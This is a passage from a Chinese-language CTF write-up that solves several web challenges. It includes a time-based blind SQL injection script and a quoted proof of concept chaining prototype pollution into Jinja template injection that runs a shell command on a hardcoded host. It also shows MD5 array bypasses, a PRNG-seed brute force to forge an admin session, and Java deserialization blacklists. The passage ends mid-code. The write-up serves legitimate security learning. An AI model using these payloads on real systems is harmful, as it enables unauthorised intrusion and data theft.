class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库的数据个数为1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库的数据个数为&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag的长度为32</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag的长度为&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_get</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">34</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># db_name_len()</span></span><br><span class="line"><span class="comment"># db_name()</span></span><br><span class="line"><span class="comment"># db_name_count()</span></span><br><span class="line"><span class="comment"># db_name_len_list()</span></span><br><span class="line"><span class="comment"># db_name_list()</span></span><br><span class="line"><span class="comment"># tb_count()</span></span><br><span class="line"><span class="comment"># tb_name_len()</span></span><br><span class="line"><span class="comment"># tb_name()</span></span><br><span class="line"><span class="comment"># flag_count()</span></span><br><span class="line"><span class="comment"># flag_name_len()</span></span><br><span class="line"><span class="comment"># flag_get()</span></span><br></pre></td></tr></table></figure>
<p>​		直接跑最后一个函数就可以得到 flag，但是时间会很长，其他的是为了让这个题有始有终，尽可能获得更多的数据。</p>
<h3 id="你一个人专属的进货网站"><a class="markdownIt-Anchor" href="#你一个人专属的进货网站">#</a> 你一个人专属的进货网站：</h3>
<p>​		看到 <code>#pip install -v pydash==5.1.2</code>  知是原型链污染。</p>
<p>​		admin 路由中存在 ssti，想进去需要伪造 session。setUserInfo 路由存在原型链污染，抓包改参数，先污染 key，之后污染 WAF 文件里的 blacklist，之后污染 user 对象里的 username 或者 setUserInfo 改名进行 ssti。</p>
<p>​		这里贴一下大佬的 poc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> url = <span class="string">&#x27;8.153.107.251:32109&#x27;</span></span><br><span class="line"> login_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/login&#x27;</span></span><br><span class="line"> setUserInfo_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/setUserInfo&#x27;</span></span><br><span class="line"> admin_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/admin&#x27;</span></span><br><span class="line"> username = <span class="string">&quot;[[g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()]]&quot;</span></span><br><span class="line"> password = <span class="string">&quot;lbz&quot;</span></span><br><span class="line"> login_data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line"> &#125;</span><br><span class="line"> response0 = requests.post(login_url, data=login_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.config.SECRET_KEY&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_start_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;[[&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response2 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_end_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;]]&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response3 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.WAF.blacklist&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;%&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">response4 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> session = <span class="built_in">input</span>(<span class="string">&quot;Enter the session cookie: &quot;</span>)</span><br><span class="line"> cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: session</span><br><span class="line"> &#125;</span><br><span class="line"> response5 = requests.get(admin_url, cookies=cookies)</span><br><span class="line"> <span class="built_in">print</span>(response5.text)</span><br></pre></td></tr></table></figure>
<p>​		session 伪造可以用 flask_session_cookie_manager 。</p>
<h3 id="ezweb"><a class="markdownIt-Anchor" href="#ezweb">#</a> ezweb</h3>
<p>​		查看源码，得到 base64 解密数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="string">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span>) &#123; <span class="comment">//xxxxx2024</span></span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		传入这个绕过前两层</p>
<blockquote>
<p>?a[]=a&amp;b[]=b&amp;c[]=c&amp;d[]=d</p>
</blockquote>
<p>​		之后的 guess 撞库获得 hECTf2024。得到 secret.php 文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//mt_srand(rand(1e5,1e7));</span></span><br><span class="line"><span class="comment">//$key = rand();</span></span><br><span class="line"><span class="comment">//file_put_contents(*,$key);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		看出来加密算法，AES-256-CBC，key 为随机生成的，种子也是随机生成的，得爆破，贴个大佬的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">100000</span>; <span class="variable">$i</span> &lt; <span class="number">10000000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">rand</span>();</span><br><span class="line">    <span class="variable">$session</span> = <span class="string">&quot;ja59o5qBBFlXzx7hHeauqrsXPoilxIhW%2F5Aq9CFdqF1kGFHBVjb7TvMlEfZwG5eBukjNbEQSV9VKTLuZevUwJuX2LZ7qc9lu22V%2B368YSXWwoHTWlM9XFUY9jWip3pUo&quot;</span>;</span><br><span class="line">    <span class="variable">$session</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span> <span class="keyword">and</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/guest|admin/i&quot;</span>, <span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">解密成功！解密后的数据</span></span><br><span class="line"><span class="string">&quot;</span> . (<span class="variable">$result</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key:&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;srand:&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解密成功！解密后的数据<br>
 O:4:“User”:2:{s:8:“username”;s:5:“guest”;s:4:“role”;s:5:“guest”;}<br>
Key:1728818262<br>
srand:8168720</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">session_encrypt</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="number">1728818262</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encrypted</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$encrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encoded</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#DWuzth9WfI2ufPUB5nI99CQuFk4nBqn8g3cvtJfSb5E4wnC+d4sICqt3hONji9RbclgNtgPZLkKQPSvO6e6INHudhIc9ofgj4GYs/6mZWx+jLaaqV+5jQLCvvGtfLLD2</span></span><br></pre></td></tr></table></figure>
<p>​		之后得到了 flag。</p>
<h3 id="ezjava"><a class="markdownIt-Anchor" href="#ezjava">#</a> ezjava：</h3>
<p>​		不会 java，所以先抄一遍学长的 wp，之后再学习下  (╥_╥)</p>
<p>​		通过附件中的 jar 包可以看出有，CC3.2.1、vaadin 依赖，推测是用 vaadin 的链子。</p>
<p>​		通过反编译 jar 包的 IndexController：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.normal;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/Controller/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String string;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">main</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/file&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span> || data.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string = data;</span><br><span class="line">        deserialize(string);      <span class="comment">//这里存在反序列化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decode);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">normal</span>(payload).blacklist(payload)) &#123;		<span class="comment">//这里有黑名单</span></span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                ois.readObject();</span><br><span class="line">                ois.close();</span><br><span class="line">                <span class="keyword">return</span> ois;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		可以看到 /file 路由，直接把传入的 string 字符串反序列化，并且 string 是我们可控的，但是下面有黑名单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/normal.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">normal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">normal</span><span class="params">(String data)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">blacklist</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        String[] blacklist = &#123;<span class="string">&quot;BadAttributeValueExpException&quot;</span>, <span class="string">&quot;Collections$UnmodifiableList&quot;</span>, <span class="string">&quot;PropertysetItem&quot;</span>, <span class="string">&quot;AbstractClientConnector&quot;</span>, <span class="string">&quot;Enum&quot;</span>, <span class="string">&quot;SQLContainer&quot;</span>, <span class="string">&quot;LinkedHashMap&quot;</span>, <span class="string">&quot;TableQuery&quot;</span>, <span class="string">&quot;AbstractTransactionalQuery&quot;</span>, <span class="string">&quot;J2EEConnectionPool&quot;</span>, <span class="string">&quot;DefaultSQLGenerator&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String list : blacklist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.contains(list)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		发现常用的 BadAttributeValueExpException</p>
<p>​		后面这里重写了 ObjectInputStream 类，看一下 MyObjectInputStream 做了哪些过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/MyObjectInputStream.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName().toLowerCase();</span><br><span class="line">        String[] denyClasses = &#123;<span class="string">&quot;java.net.InetAddress&quot;</span>, <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="string">&quot;C3P0&quot;</span>, <span class="string">&quot;Jackson&quot;</span>, <span class="string">&quot;NestedMethodProperty&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>&#125;;</span><br><span 